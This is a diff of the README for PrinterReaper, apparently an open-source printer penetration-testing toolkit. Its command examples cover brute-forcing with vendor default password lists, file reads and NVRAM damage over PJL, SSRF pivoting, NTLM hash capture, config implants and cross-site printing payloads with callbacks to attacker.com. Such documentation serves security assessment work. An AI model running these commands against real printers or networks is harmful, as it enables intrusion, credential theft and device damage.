@@ -1,404 +1,474 @@
+<div align="center">
+
+<a href="https://www.uniaogeek.com.br"><img src="img/logotype-uniaogeek-2.png" width="240" alt="União Geek"></a>
+
 # PrinterReaper v3.7.0
 
-> **Advanced Printer Penetration Testing Toolkit**
-> Discover. Fingerprint. Exploit. Pivot. Report.
+*Advanced Printer Penetration Testing Toolkit*
 
-PrinterReaper is a complete, modular framework for security assessment of network printers — covering all major printer languages (PJL, PostScript, PCL, ESC/P), all common network protocols (RAW, IPP, LPD, SMB, HTTP, SNMP, FTP, Telnet), 39+ exploit modules, an external wordlist-driven credential engine, ML-assisted fingerprinting, CVE/NVD integration, and automated lateral movement mapping.
+**Discover · Fingerprint · Exploit · Pivot · Report**
 
-> Built and maintained by **[@mrhenrike](https://github.com/mrhenrike)** — [LinkedIn](https://linkedin.com/in/mrhenrike) · [X/Twitter](https://x.com/mrhenrike)
+[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://python.org)
+[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
+[![Version](https://img.shields.io/badge/Version-3.7.0-red)](https://github.com/mrhenrike/PrinterReaper/releases)
+[![Wiki](https://img.shields.io/badge/Wiki-GitHub-orange)](https://github.com/mrhenrike/PrinterReaper/wiki)
+
+> **"Is your printer safe from the void? Find out before someone else does."**
+
+**[Website](https://www.uniaogeek.com.br/printer-reaper)** · **[Wiki](https://github.com/mrhenrike/PrinterReaper/wiki)** · **[Issues](https://github.com/mrhenrike/PrinterReaper/issues)** · **[Releases](https://github.com/mrhenrike/PrinterReaper/releases)**
+
+</div>
 
 ---
 
-## Architecture — What Can Be Exploited
+PrinterReaper is a complete, modular framework for security assessment of network printers. It covers all major printer languages (PJL, PostScript, PCL, ESC/P), all common protocols (RAW, IPP, LPD, SMB, HTTP, SNMP, FTP, Telnet), 39+ exploit modules, an external wordlist-driven credential engine with zero hardcoded passwords, ML-assisted fingerprinting, NVD/CVE integration, automated lateral movement, firmware analysis, and Cross-Site Printing payloads.
 
-![Printer Attack Surface](img/printer_architecture.svg)
+---
 
-A network printer exposes multiple attack surfaces simultaneously: **print channels** (RAW 9100, IPP 631, LPD 515) accept raw printer language commands; **management channels** (HTTP/EWS 80, SMB 445) expose administrative interfaces; **high-risk services** (SNMP 161, FTP 21, Telnet 23) often run with default credentials or misconfigured access controls. PrinterReaper targets all of them.
+## Architecture — Printer Attack Surface
+
+![Printer Attack Surface](img/printer_architecture.png)
 
 ---
 
 ## Operational Workflow
 
-![PrinterReaper Workflow](img/printerreaper_workflow.svg)
+![PrinterReaper Workflow](img/printerreaper_workflow.png)
 
-| Phase | What happens | Key flags |
-|-------|-------------|-----------|
-| **Discover** | SNMP sweep, local enumeration, Shodan/Censys, WSD | `--discover-local` `--discover-online` |
-| **Fingerprint** | Banner grab (HTTP/IPP/SNMP/PJL/LPD/WSD), ML model | `--scan` `--scan-ml` |
-| **Assess** | CVE/NVD lookup, exploit matching, attack surface score | `--scan --no-nvd` |
-| **Exploit** | PJL/PS/PCL commands, brute-force login, exploit modules | `pjl` `ps` `pcl` `--bruteforce` `--xpl-run` |
-| **Pivot** | SSRF via IPP/WSD, network map, LDAP hash capture | `--pivot` `--network-map` |
-| **Report** | Terminal log, handoff.md, CVE list, found credentials | `.log/terminal-output.log` |
+> Flow source files (editable in [draw.io](https://app.diagrams.net)): `diagrams/printerreaper_workflow.drawio` · `diagrams/credential_flow.drawio` · `diagrams/attack_matrix.drawio`
 
 ---
 
-## Attack Coverage
+## Attack Coverage Matrix
 
-![Attack Coverage Matrix](img/attack_coverage_matrix.svg)
-
-All attack categories from the **Müller et al. BlackHat USA 2017** printer exploitation research are implemented, plus additional post-2020 CVEs and new attack classes:
-
-| Category | Technique | Protocol | Source |
-|----------|-----------|----------|--------|
-| DoS | PS infinite loop `{} loop` | PostScript/RAW | Müller 2017 |
-| DoS | showpage redefinition | PostScript/exitserver | Müller 2017 |
-| DoS | Offline mode | PJL | Müller 2017 |
-| DoS | Physical NVRAM damage (`@PJL DEFAULT COPIES=X`) | PJL | Müller 2017 |
-| DoS | FORMLINES crash | PJL | CVE-2024-51982 |
-| DoS | IPP queue purge | IPP | RFC 8011 |
-| ProtBypass | Password disclosure via `PJL INFO VARIABLES` | PJL | Müller 2017 |
-| ProtBypass | Factory reset via `@PJL DMCMD ASCIIHEX=...` | PML | Müller 2017 |
-| ProtBypass | exitserver operator unlock | PostScript | Müller 2017 |
-| ProtBypass | SNMP SET factory reset | SNMP | Generic |
-| JobManip | Page overlay (watermark/stamp injection) | PostScript | Advisory 1/6 |
-| JobManip | Print job capture + retention | PostScript/exitserver | Advisory 1/6 |
-| JobManip | Captured job enumeration | PostScript/capturedict | Advisory 1/6 |
-| InfoDisc | PJL memory dump (`@PJL DMINFO`) | PJL | Müller 2017 |
-| InfoDisc | Filesystem listing (`filenameforall`) | PostScript | Müller 2017 |
-| InfoDisc | Credential file extraction | PS/PJL path traversal | Müller 2017 |
-| InfoDisc | Cross-Site Printing + CORS spoofing | PostScript + HTTP | XSP research |
-| InfoDisc | SNMP MIB walk (2000+ OIDs) | SNMP | Generic |
-| CredAttack | HTTP/HTTPS brute-force (form+BasicAuth+Digest) | HTTP | PrinterReaper |
-| CredAttack | FTP default credentials | FTP | PrinterReaper |
-| CredAttack | SNMP community string enumeration | SNMP | PrinterReaper |
-| CredAttack | Telnet login brute-force | Telnet | PrinterReaper |
-| Lateral | SSRF via IPP Print-URI / WSD SOAP | IPP/WSD | PrinterReaper |
-| Lateral | LDAP/AD NTLM hash capture via rogue server | HTTP/LDAP | Research module |
-| Lateral | Network map: routing table, ARP cache, subnet scan | SNMP/PJL | PrinterReaper |
+![Attack Coverage Matrix](img/attack_coverage_matrix.png)
 
 ---
 
-## Credential Architecture (v3.7.0)
+## Credential Architecture — Zero Hardcoded Passwords
 
-![Credential Wordlist Flow](img/credential_wordlist_flow.svg)
+![Credential Wordlist Flow](img/credential_wordlist_flow.png)
 
-**Zero hardcoded credentials** — all credential data lives in external wordlist files under `wordlists/`:
+---
 
-```
-wordlists/
-  printer_default_creds.txt   # 195+ user:pass, sections by vendor
-  snmp_communities.txt        # SNMP community strings
-  ftp_creds.txt               # FTP credentials for printer file servers
-  pjl_passwords.txt           # PJL protection bypass passwords
-```
+## PrinterReaper vs PRET — Benchmark
 
-### Wordlist format — vendor sections
+[PRET](https://github.com/RUB-NDS/PRET) (Printer Exploitation Toolkit) is the reference tool from the BlackHat 2017 research by Müller et al. PrinterReaper was initially forked from it and has since been rewritten and massively extended.
 
-```
-# ── HP (Hewlett-Packard) ─────────────────────────────────────────────────────
-Admin:Admin
-jetdirect:
-admin:hpinvent!
+| Feature | PRET | PrinterReaper v3.7.0 |
+|---------|------|----------------------|
+| **Languages** | PJL, PS, PCL | PJL, PS, PCL, ESC/P, auto |
+| **Protocols** | RAW, LPD, IPP, USB | RAW, LPD, IPP, SMB, HTTP, SNMP, FTP, Telnet |
+| **CVE Database** | None | 50+ CVEs built-in + NVD API live lookup |
+| **Exploit Library** | None | 39+ modules (ExploitDB, Metasploit, Research) |
+| **Brute-Force** | None | HTTP, FTP, SNMP, Telnet — wordlist-driven, 0 hardcoded creds |
+| **Credential Engine** | None | External wordlists, vendor sections, token expansion, variations |
+| **Network Discovery** | None | SNMP sweep, Shodan, Censys, WSD, installed printers |
+| **Fingerprinting** | Basic banner | Multi-protocol banner grab + ML classifier |
+| **CVE Scan** | None | NVD API + offline fallback + auto exploit matching |
+| **ML Engine** | None | scikit-learn fingerprinting + attack scoring |
+| **Lateral Movement** | None | SSRF via IPP/WSD, network map, LDAP NTLM hash capture |
+| **Firmware Analysis** | None | Version extraction, upload endpoint check, NVRAM r/w |
+| **Storage Audit** | None | FTP, web file manager, SNMP MIB dump, saved jobs |
+| **Cross-Site Printing** | None | XSP + CORS spoofing payload generator (5 attack types) |
+| **Attack Matrix** | None | Full BlackHat 2017 campaign + 2024-2025 CVEs |
+| **Send Print Job** | Partial | Any format: .ps/.pcl/.pdf/.txt/.png/.jpg/.doc + raw |
+| **Interactive Menu** | None | Full guided TUI with next-steps and hints |
+| **Config / API Keys** | None | config.json with Shodan, Censys, NVD, ML flags |
+| **Python Version** | 2.7 (legacy) | 3.8+ (typed, async-capable) |
+| **Windows Support** | Limited | Full (PowerShell launchers, EDR-safe venv) |
+| **IPv6** | No | Yes |
+| **SMB** | No | Yes (pysmb) |
+| **Wiki / Docs** | Basic README | Full GitHub wiki + draw.io diagrams |
 
-# ── Epson ─────────────────────────────────────────────────────────────────────
-admin:epson
-admin:__SERIAL__
-```
+**Summary:** PrinterReaper covers the same core PJL/PS/PCL shell as PRET plus a complete post-exploitation, discovery, brute-force, CVE, and lateral movement framework on top.
 
-Token entries are expanded at runtime:
-- `__SERIAL__` → replaced with `--bf-serial` value (e.g. `XAABT77481`)
-- `__MAC6__` → last 6 hex chars of MAC (used by OKI, Brother, Kyocera)
-- `__MAC12__` → full 12-char MAC without separators
+---
 
-### Brute-force usage
+## Installation
 
 ```bash
-# Use default wordlist (wordlists/printer_default_creds.txt)
-python src/main.py 192.168.1.100 --bruteforce --bf-vendor epson --bf-serial XAABT77481
-
-# Use a custom wordlist instead of the default
-python src/main.py 192.168.1.100 --bruteforce --bf-wordlist /path/to/my_creds.txt
-
-# Add individual credentials on top of the wordlist
-python src/main.py 192.168.1.100 --bruteforce --bf-cred admin:MyPass --bf-cred root:
-
-# Disable variation engine (faster — no leet/reverse/camelcase mutations)
-python src/main.py 192.168.1.100 --bruteforce --bf-no-variations
-
-# With vendor auto-detection and serial number
-python src/main.py 192.168.1.100 --scan --bruteforce --bf-serial XAABT77481
-```
-
-Password variations generated per base password: `normal`, `reverse`, `leet` (a→@ e→3 i→1 o→0 s→$ t→7), `CamelCase`, `UPPER`, `lower`, `reverse+leet`, `base+1`, `base+!`, `1+base`.
-
----
-
-## Quick Start
-
-```bash
-# Clone
 git clone https://github.com/mrhenrike/PrinterReaper.git
 cd PrinterReaper
 
-# Create virtual environment (recommended — avoids EDR conflicts with temp dirs)
 python -m venv .venv
-.venv\Scripts\activate        # Windows
-source .venv/bin/activate     # Linux / macOS
+source .venv/bin/activate        # Linux / macOS
+.venv\Scripts\activate           # Windows PowerShell
 
-# Install dependencies
 pip install -r requirements.txt
-
-# Verify
-python src/main.py --version
+python printer-reaper.py --version
+# → printerreaper Version 3.7.0 (2026-03-25)
 ```
 
-### Discover printers
+**Requirements:** Python 3.8+ · Windows / Linux / macOS · 80 MB disk
+
+---
+
+## Entry Point
 
 ```bash
-# Local network SNMP discovery
-python src/main.py --discover-local
-
-# Online discovery (requires Shodan/Censys API key in config.json)
-python src/main.py --discover-online
+python printer-reaper.py [target] [mode] [options]
 ```
 
-### Scan a target
+| Example | What it does |
+|---------|-------------|
+| `python printer-reaper.py` | Interactive guided menu |
+| `python printer-reaper.py --help` | Full flag reference |
+| `python printer-reaper.py 192.168.1.100 --scan` | Passive fingerprint + CVE scan |
+| `python printer-reaper.py 192.168.1.100 pjl` | PJL interactive shell |
+| `python printer-reaper.py 192.168.1.100 --bruteforce --bf-vendor epson` | Credential brute-force |
+| `python printer-reaper.py 192.168.1.100 --attack-matrix` | Full attack campaign |
+| `python printer-reaper.py 192.168.1.100 --xpl-list` | List all exploit modules |
+
+---
+
+## 1. Discovery
 
 ```bash
-# Passive recon — no payloads sent
-python src/main.py 192.168.1.100 --scan
+# SNMP sweep + installed printers on host
+python printer-reaper.py --discover-local
 
-# With ML-assisted attack scoring
-python src/main.py 192.168.1.100 --scan-ml
+# Online — Shodan / Censys (needs API keys in config.json)
+python printer-reaper.py --discover-online
 
-# Offline mode (no NVD API call)
-python src/main.py 192.168.1.100 --scan --no-nvd
-```
+# Passive OSINT check for a specific IP
+python printer-reaper.py 192.168.1.100 --osint
 
-### Interactive shell
-
-```bash
-# Auto-detect best printer language
-python src/main.py 192.168.1.100 auto
-
-# Specific language
-python src/main.py 192.168.1.100 pjl    # PJL — filesystem, NVRAM, job control
-python src/main.py 192.168.1.100 ps     # PostScript — Turing-complete, overlays
-python src/main.py 192.168.1.100 pcl    # PCL — legacy, macro filesystem
+# Detect supported languages without connecting
+python printer-reaper.py 192.168.1.100 --auto-detect
 ```
 
 ---
 
-## Exploit Library
+## 2. Reconnaissance
 
 ```bash
-# List all available exploits (sorted by CVSS severity)
-python src/main.py 192.168.1.100 --xpl-list
+# Full passive scan: banner grab + CVE/NVD lookup + exploit matching
+python printer-reaper.py 192.168.1.100 --scan
 
-# Check if target is vulnerable (non-destructive probe)
-python src/main.py 192.168.1.100 --xpl-check edb-35151
+# Same + ML fingerprinting and attack scoring
+python printer-reaper.py 192.168.1.100 --scan-ml
 
-# Run exploit in dry-run mode (default — safe)
-python src/main.py 192.168.1.100 --xpl-run edb-35151
+# Offline (skip NVD API)
+python printer-reaper.py 192.168.1.100 --scan --no-nvd
 
-# Live exploitation (AUTHORIZED LABS ONLY)
-python src/main.py 192.168.1.100 --xpl-run edb-35151 --no-dry
+# Scan + immediately match exploit modules
+python printer-reaper.py 192.168.1.100 --scan --xpl
 
-# Download a new exploit from ExploitDB into xpl/
-python src/main.py --xpl-fetch 47850
-```
-
-The `xpl/` directory structure:
-```
-xpl/
-  edb-15631/          # HP PJL directory traversal (EDB-15631)
-  edb-17636/          # Xerox FTP default creds (EDB-17636)
-  edb-35151/          # HP LaserJet remote disclosure (EDB-35151)
-  edb-45273/          # Ricoh Web Image Monitor auth bypass (EDB-45273)
-  msf-pjl-traversal/  # Metasploit: PJL filesystem traversal
-  msf-hp-ews-auth/    # Metasploit: HP EWS authentication bypass
-  research-ldap-hash-capture/  # NTLM hash capture via rogue LDAP
-  edb-cve-2024-51978/ # Brother WBM default password exposure
-  custom/             # Drop your own exploit.py + metadata.json here
-  index.json          # Auto-generated exploit index
-```
-
-Each exploit module exports:
-```python
-def check(host, port, **kwargs) -> bool:  # non-destructive probe
-def run(host, port, **kwargs) -> dict:    # full execution (respects dry_run flag)
+# Combined: scan auto-populates vendor + serial for bruteforce
+python printer-reaper.py 192.168.1.100 --scan --bruteforce
 ```
 
 ---
 
-## Full Attack Matrix Campaign
+## 3. Interactive Shell
 
 ```bash
-# Run all attack categories (dry-run — probe only)
-python src/main.py 192.168.1.100 --attack-matrix
+# Auto-detect best language
+python printer-reaper.py 192.168.1.100 auto
 
-# Live exploitation (AUTHORIZED LABS ONLY — irreversible actions)
-python src/main.py 192.168.1.100 --attack-matrix --no-dry
+# Specific languages
+python printer-reaper.py 192.168.1.100 pjl       # PJL: filesystem, NVRAM, control
+python printer-reaper.py 192.168.1.100 ps        # PostScript: operators, job capture
+python printer-reaper.py 192.168.1.100 pcl       # PCL: macro filesystem
 
-# Attack matrix + network mapping in one pass
-python src/main.py 192.168.1.100 --attack-matrix --network-map
+# Debug, batch, log modes
+python printer-reaper.py 192.168.1.100 pjl --debug
+python printer-reaper.py 192.168.1.100 pjl -i commands.txt -o session.log -q
+```
+
+**Key PJL commands:**
+
+```bash
+192.168.1.100:/> id              # model, firmware, serial
+192.168.1.100:/> network         # IP, gateway, DNS, WINS, MAC
+192.168.1.100:/> ls /            # filesystem listing
+192.168.1.100:/> cat /etc/passwd # read file
+192.168.1.100:/> download /webServer/config/soe.xml
+192.168.1.100:/> nvram read      # NVRAM dump
+192.168.1.100:/> display "HACKED"
+192.168.1.100:/> destroy         # NVRAM damage (lab only)
 ```
 
 ---
 
-## Network Mapping & Lateral Movement
+## 4. Credential Brute-Force
 
 ```bash
+# Auto-detect vendor, use default wordlist
+python printer-reaper.py 192.168.1.100 --bruteforce
+
+# Explicit vendor + serial (Epson / HP / Canon)
+python printer-reaper.py 192.168.1.100 --bruteforce --bf-vendor epson --bf-serial XAABT77481
+
+# MAC-based tokens (OKI, Brother, Kyocera KR2)
+python printer-reaper.py 192.168.1.100 --bruteforce --bf-vendor oki --bf-mac AA:BB:CC:DD:EE:FF
+
+# Custom wordlist (replaces default)
+python printer-reaper.py 192.168.1.100 --bruteforce --bf-wordlist /path/to/creds.txt
+
+# Add individual credentials (highest priority)
+python printer-reaper.py 192.168.1.100 --bruteforce --bf-cred admin:MyPass --bf-cred root:
+
+# No variation engine (faster)
+python printer-reaper.py 192.168.1.100 --bruteforce --bf-no-variations --bf-delay 2.0
+```
+
+**Protocols tested:** HTTP/HTTPS · FTP · SNMP community strings · Telnet
+
+**Wordlist format:**
+```
+# ── Epson ──────────────────────────────────────────────────────────────────
+admin:epson
+admin:__SERIAL__      # expanded to --bf-serial value at runtime
+# ── HP ─────────────────────────────────────────────────────────────────────
+Admin:Admin
+jetdirect:
+admin:hpinvent!
+```
+
+---
+
+## 5. Exploit Library
+
+```bash
+# List all 39+ modules sorted by CVSS
+python printer-reaper.py 192.168.1.100 --xpl-list
+python printer-reaper.py 192.168.1.100 --xpl-list --xpl-source exploit-db
+
+# Non-destructive vulnerability check
+python printer-reaper.py 192.168.1.100 --xpl-check edb-35151
+python printer-reaper.py 192.168.1.100 --xpl-check edb-cve-2024-51978
+
+# Run exploit (dry-run default)
+python printer-reaper.py 192.168.1.100 --xpl-run edb-35151
+python printer-reaper.py 192.168.1.100 --xpl-run edb-35151 --no-dry  # live
+
+# Download exploit from ExploitDB
+python printer-reaper.py --xpl-fetch 45273
+
+# Rebuild index after adding modules
+python printer-reaper.py --xpl-update
+```
+
+---
+
+## 6. Full Attack Matrix
+
+Runs every attack category from BlackHat 2017 + 2024-2025 CVEs:
+
+```bash
+# Dry-run (probe only)
+python printer-reaper.py 192.168.1.100 --attack-matrix
+
+# Live exploitation — AUTHORIZED LABS ONLY
+python printer-reaper.py 192.168.1.100 --attack-matrix --no-dry
+
+# Combined with network map
+python printer-reaper.py 192.168.1.100 --attack-matrix --network-map --no-dry
+```
+
+**Categories:** DoS · Protection Bypass · Job Manipulation · Information Disclosure · CORS/XSP · SNMP write · Network pivoting
+
+---
+
+## 7. Lateral Movement & Network Mapping
+
+```bash
+# SSRF audit via IPP/WSD
+python printer-reaper.py 192.168.1.100 --pivot
+
+# Port-scan internal host via printer SSRF
+python printer-reaper.py 192.168.1.100 --pivot-scan 10.0.0.1
+
 # Full network map from printer's perspective
-python src/main.py 192.168.1.100 --network-map
+python printer-reaper.py 192.168.1.100 --network-map
 
-# SSRF pivot — use printer to reach internal hosts
-python src/main.py 192.168.1.100 --pivot
-
-# Port-scan an internal host via printer SSRF
-python src/main.py 192.168.1.100 --pivot-scan 10.0.0.1
+# LDAP NTLM hash capture
+python printer-reaper.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
 ```
-
-Output includes:
-- SNMP routing table, ARP cache, interface list
-- PJL network variables (IP, gateway, DNS, WINS, NTP)
-- Web config page scraping (IPs, MACs, gateway)
-- Full /24 subnet scan (60 threads, 18 key ports)
-- WSD device discovery
-- Attack paths per discovered host
 
 ---
 
-## Cross-Site Printing (XSP) + CORS Spoofing
+## 8. Storage, Firmware & Payloads
 
 ```bash
-# Generate XSP payload — printer info disclosure via victim browser
-python src/main.py 192.168.1.100 --xsp info
+# Storage audit: FTP, web file manager, SNMP MIB, saved jobs
+python printer-reaper.py 192.168.1.100 --storage
 
-# Generate print job capture payload
-python src/main.py 192.168.1.100 --xsp capture
+# Firmware: version, upload endpoint check, NVRAM probe
+python printer-reaper.py 192.168.1.100 --firmware
 
-# Generate DoS payload for web attacker model
-python src/main.py 192.168.1.100 --xsp dos
+# Factory reset (dry-run probes endpoints)
+python printer-reaper.py 192.168.1.100 --firmware-reset pjl
+python printer-reaper.py 192.168.1.100 --firmware-reset web
 
-# With exfil callback
-python src/main.py 192.168.1.100 --xsp exfil --xsp-callback https://attacker.com/recv
+# Persistent config implant
+python printer-reaper.py 192.168.1.100 --implant smtp_host=attacker.com
+python printer-reaper.py 192.168.1.100 --implant snmp_community=hacked
+
+# Language-specific payload injection
+python printer-reaper.py 192.168.1.100 --payload pjl:reset
+python printer-reaper.py 192.168.1.100 --payload ps:loop
+python printer-reaper.py 192.168.1.100 --payload ps:custom --payload-data "statusdict begin showROMfonts end"
 ```
-
-XSP payloads create HTML+JavaScript files that use `XMLHttpRequest` to send PostScript to port 9100 via the victim's browser, bypassing the same-origin policy using CORS spoofing techniques.
 
 ---
 
-## Storage & Firmware
+## 9. Cross-Site Printing (XSP)
 
 ```bash
-# Printer storage audit: FTP, web file manager, SNMP MIB dump, saved jobs
-python src/main.py 192.168.1.100 --storage
-
-# Firmware audit: version extraction, upload endpoint check, NVRAM probe
-python src/main.py 192.168.1.100 --firmware
-
-# Attempt factory reset (DANGEROUS — authorized labs only)
-python src/main.py 192.168.1.100 --firmware-reset pjl
-
-# Persistent config implant (set SMTP/DNS/SNMP via web or PJL)
-python src/main.py 192.168.1.100 --implant smtp_host=attacker.com
+# Generate attack payloads (deployed via phishing / watering hole)
+python printer-reaper.py 192.168.1.100 --xsp info
+python printer-reaper.py 192.168.1.100 --xsp capture --xsp-callback https://attacker.com/log
+python printer-reaper.py 192.168.1.100 --xsp dos
+python printer-reaper.py 192.168.1.100 --xsp nvram
+python printer-reaper.py 192.168.1.100 --xsp exfil
 ```
 
 ---
 
-## Send Print Job
+## 10. IPP & Send Job
 
 ```bash
-# Send a document to print on the target printer
-python src/main.py 192.168.1.100 --send-job report.pdf
-python src/main.py 192.168.1.100 --send-job document.txt
-python src/main.py 192.168.1.100 --send-job image.jpg
+# Full IPP security audit
+python printer-reaper.py 192.168.1.100 --ipp
 
-# Override port and protocol
-python src/main.py 192.168.1.100 --send-job report.pdf --port 9100
-```
+# Submit anonymous print job (dry-run)
+python printer-reaper.py 192.168.1.100 --ipp-submit
+python printer-reaper.py 192.168.1.100 --ipp-submit --no-dry
 
-Supported formats: `.ps`, `.pcl`, `.pdf`, `.txt`, `.png`, `.jpg`, `.doc`, `.docx`, and any raw format.
-
----
-
-## Interactive Shell Commands
-
-Once connected (`python src/main.py <IP> pjl`), you have access to 109 commands:
-
-### Filesystem (PJL + PS)
-```
-ls, mkdir, find, upload, download, delete, copy, move, touch
-chmod, permissions, rmdir, mirror, get, put, cat, edit, append, fuzz
-```
-
-### Information
-```
-id, version, devices, uptime, date, pagecount, variables, printenv
-network, info, scan_volumes, firmware_info, dicts, dump, known, search
-```
-
-### Control
-```
-set, display, offline, restart, reset, selftest, backup, restore
-config, formfeed, copies, open, close, timeout, reconnect
-```
-
-### Attacks
-```
-destroy, flood, hold, format, capture, overlay, cross, replace
-hang, payload, traverse, dos_display, dos_jobs, dos_connections, exfiltrate, backdoor
+# Send any file to printer
+python printer-reaper.py 192.168.1.100 --send-job document.pdf
+python printer-reaper.py 192.168.1.100 --send-job payload.ps --send-proto raw
+python printer-reaper.py 192.168.1.100 --send-job flyer.pdf --send-copies 10 --send-proto lpd
 ```
 
 ---
 
-## Module Comparison
+## Full Flag Reference
 
-| Feature | PJL | PostScript | PCL |
-|---------|-----|------------|-----|
-| Commands | 54 | 40 | 15 |
-| Filesystem access | Full | Full | Virtual |
-| Path traversal | Yes | Yes | No |
-| NVRAM read/write | Yes | No | No |
-| Job capture | Yes | Yes | No |
-| Page overlays | No | Yes | No |
-| Text replacement | No | Yes | No |
-| Lock/Unlock | Yes | Yes | No |
-| Best for | HP, Brother, Ricoh | Advanced attacks | Legacy devices |
+```
+POSITIONAL
+  target               Printer IP or hostname
+  mode                 pjl | ps | pcl | auto
+
+GENERAL
+  -h, --help           Show help
+  --version            Show version
+  -q, --quiet          Suppress banner
+  -d, --debug          Show raw bytes
+  -s, --safe           Verify language support before connecting
+  -i FILE              Batch commands from file
+  -o FILE              Log raw sent data to file
+  --config PATH        Custom config.json
+  -I, --interactive    Guided menu
+
+DISCOVERY
+  --discover-local     SNMP sweep + host installed printers
+  --discover-online    Shodan / Censys search
+  --osint              Passive OSINT for target IP
+  --auto-detect        Detect supported printer languages
+
+RECON (no payloads)
+  --scan               Banner grab + CVE lookup + attack surface
+  --scan-ml            --scan + ML fingerprinting + attack scoring
+  --no-nvd             Skip NVD API (offline mode)
+  --xpl                Auto-match exploits after --scan
+
+IPP
+  --ipp                Full IPP security audit
+  --ipp-submit         Submit anonymous IPP job (dry-run)
+  --no-dry             Disable dry-run
+
+PAYLOAD
+  --payload LANG:TYPE  Inject language-specific payload
+  --payload-data STR   Custom PS/PJL string
+
+SEND JOB
+  --send-job FILE      Send file to printer
+  --send-proto PROTO   raw (9100) | ipp (631) | lpd (515)
+  --send-copies N      Number of copies (default: 1)
+  --send-queue NAME    LPD queue name (default: lp)
+
+LATERAL MOVEMENT
+  --pivot              SSRF audit via IPP/WSD
+  --pivot-scan HOST    Port-scan HOST via printer SSRF
+  --network-map        Full network map from printer's perspective
+  --implant KEY=VALUE  Persistent config implant
+
+STORAGE & FIRMWARE
+  --storage            FTP, web, SNMP MIB, saved jobs audit
+  --firmware           Firmware version, upload endpoint, NVRAM
+  --firmware-reset M   Factory reset via pjl | web | ipp (DANGEROUS)
+
+ATTACK CAMPAIGN
+  --attack-matrix      Full BlackHat 2017 campaign (dry-run default)
+  --no-dry             Live exploitation
+
+XSP
+  --xsp TYPE           info | capture | dos | nvram | exfil
+  --xsp-callback URL   Callback URL for exfil
+
+EXPLOIT LIBRARY
+  --xpl-list           List all exploits
+  --xpl-source SRC     metasploit | exploit-db | research | custom
+  --xpl-check ID       Non-destructive probe
+  --xpl-run ID         Run exploit (add --no-dry for live)
+  --xpl-update         Rebuild xpl/index.json
+  --xpl-fetch EDB_ID   Download from ExploitDB
+
+BRUTE-FORCE
+  --bruteforce         BF: HTTP, FTP, SNMP, Telnet
+  --bf-vendor VENDOR   Vendor override
+  --bf-serial SERIAL   Device serial (__SERIAL__ token)
+  --bf-mac MAC         MAC address (__MAC6__, __MAC12__ tokens)
+  --bf-wordlist FILE   Custom wordlist (replaces default)
+  --bf-cred USER:PASS  Extra credential (repeatable)
+  --bf-no-variations   Disable leet/reverse/camelcase
+  --bf-delay SECS      Delay between attempts (default: 0.3s)
+
+CONFIG
+  --check-config       Show API key status
+```
 
 ---
 
-## Configuration (API Keys)
+## Supported Vendors (20+)
 
-Copy `config.json.example` to `config.json` and fill in your API keys:
+Epson · HP · Brother · Ricoh · Xerox · Canon · Kyocera · Samsung · OKI · Lexmark · Konica Minolta · Fujifilm · Sharp · Toshiba · Zebra · Axis · Pantum · Sindoh · Develop · Utax
+
+---
+
+## Configuration
 
 ```json
 {
-  "shodan":  { "api_key": "YOUR_SHODAN_KEY" },
-  "censys":  { "api_id": "",  "api_secret": "" },
-  "nvd":     { "api_key": "YOUR_NVD_KEY" },
-  "ml":      { "enabled": true }
+  "shodan":  { "api_key": "YOUR_KEY" },
+  "censys":  { "api_id": "YOUR_ID", "api_secret": "YOUR_SECRET" },
+  "nvd":     { "api_key": "YOUR_KEY" },
+  "ml":      { "enabled": true },
+  "network": { "timeout": 6, "snmp_timeout": 3 }
 }
 ```
 
-Check which features are available:
 ```bash
-python src/main.py --check-config
+cp config.json.example config.json
+python printer-reaper.py --check-config
 ```
 
 ---
 
-## Supported Vendors
+## Diagram Sources
 
-20+ vendors with dedicated wordlist sections and exploit modules:
+All flow diagrams are editable in [diagrams.net / draw.io](https://app.diagrams.net):
 
-| Vendor | Default Creds | Exploits | Notes |
-|--------|--------------|---------|-------|
-| HP | admin:(blank), Admin:Admin, jetdirect: | EDB-15631, EDB-35151, MSF-HP-EWS | Serial number in newer models |
-| Epson | admin:epson, admin:\<serial\> | SNMP, IPP, HTTP | L3250 validated in lab |
-| Brother | admin:initpass, admin:access | CVE-2024-51978 (SNMP OID) | WBM password via SNMP |
-| Ricoh | admin:(blank), supervisor:(blank) | EDB-45273 | supervisor is undocumented backdoor |
-| Xerox | admin:1111, admin:admin | EDB-17636 | FTP default creds |
-| Canon | admin:(blank), ADMIN:canon | CVE-2023-27516, CVE-2019-14308 | Session fixation |
-| Kyocera | Admin:Admin, admin:admin | MSF-Kyocera-FS | KR2 uses MAC as password |
-| Samsung | admin:sec00000, admin:1234 | MSF-Samsung-6600 | SyncThru web service |
-| OKI | admin:aaaaaa, admin:\<mac6\> | PJL-based | Last 6 of MAC address |
-| Lexmark | admin:1234, admin:password | EDB-20565 | HTTP auth bypass |
-| Konica Minolta | admin:(blank), 12345678:12345678 | IPP, SNMP | bizhub series |
-| Fujifilm | x-admin:11111, admin:admin | Custom | Printix Go integration |
-| Zebra | admin:1234, admin:admin | HTTP, SNMP | ZD421/ZD621 series |
-| Axis | root:pass, admin:admin | Custom | Print server |
+| File | Description |
+|------|-------------|
+| `diagrams/printerreaper_workflow.drawio` | 6-phase operational workflow |
+| `diagrams/credential_flow.drawio` | Credential architecture flow |
+| `diagrams/attack_matrix.drawio` | Attack coverage matrix |
+| `diagrams/*.mmd` | Mermaid source diagrams |
 
 ---
 
@@ -406,85 +476,52 @@ python src/main.py --check-config
 
 | Version | Date | Highlights |
 |---------|------|------------|
-| **3.7.0** | 2026-03-25 | Wordlist-driven creds (no hardcode), `wordlist_loader.py`, `--bf-wordlist` replaces default, validated on Epson L3250 + 7 emulated printers |
-| 3.6.2 | 2026-03-25 | LDAP hash capture module, CVE-2024-51978 (Brother), Fujifilm/Axis/Zebra/IBM/Minolta creds |
-| 3.6.1 | 2026-03-24 | Expanded creds DB: Ricoh supervisor backdoor, Canon ADMIN/canon, Xerox 22222/2222 |
-| 3.6.0 | 2026-03-24 | 7 new BlackHat 2017 exploit modules + EDB-2024 research modules |
-| 3.5.0 | 2026-03-24 | `--send-job` (any file format), `wordlists/` subfolder, emoji-free CLI |
-| 3.4.2 | 2026-03-24 | Interactive guided menu, spinner, section headers, next-steps hints |
-| 3.4.1 | 2026-03-24 | Default credentials DB (14 vendors), login brute-force engine, variation generator |
